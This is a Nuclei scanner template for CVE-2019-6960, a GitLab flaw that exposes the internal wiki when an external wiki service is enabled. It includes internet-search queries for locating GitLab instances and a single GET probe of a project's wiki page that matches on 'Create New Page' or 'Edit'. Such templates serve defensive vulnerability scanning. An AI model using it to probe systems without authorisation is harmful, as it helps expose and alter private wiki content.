id: CVE-2019-6960

info:
  name: GitLab Incorrect Access Control on Internal Wiki with External Service Enabled
  author: ProjectDiscoveryAI
  severity: critical
  description: An issue was discovered in GitLab Community and Enterprise Edition 9.x, 10.x, and 11.x before 11.5.8, 11.6.x before 11.6.6, and 11.7.x before 11.7.1. It has Incorrect Access Control. Access to the internal wiki is permitted when an external wiki service is enabled.
  impact: |
    An attacker can view and modify sensitive information on the internal wiki
  remediation: |
    Upgrade GitLab to a version that includes the fix for CVE-2019-6960
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2019-6960
    epss-score: 0.00205
    epss-percentile: 0.59216
    cpe: cpe:2.3:a:gitlab:gitlab:*:*:*:*:community:*:*:*
  metadata:
    vendor: gitlab
    product: gitlab
    shodan-query: http.title:"GitLab"
    fofa-query:
      - body="gitlab enterprise edition"
      - body="gitlab-ci.yml"
      - title="gitlab"
    google-query: intitle:"gitlab"

http:
  - method: GET
    path:
      - "{{BaseURL}}/{{namespace}}/{{project-name}}/wikis/home"

    headers:
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36
    matchers:
      - type: word
        words:
          - "Create New Page"
          - "Edit"
        part: body
        condition: or
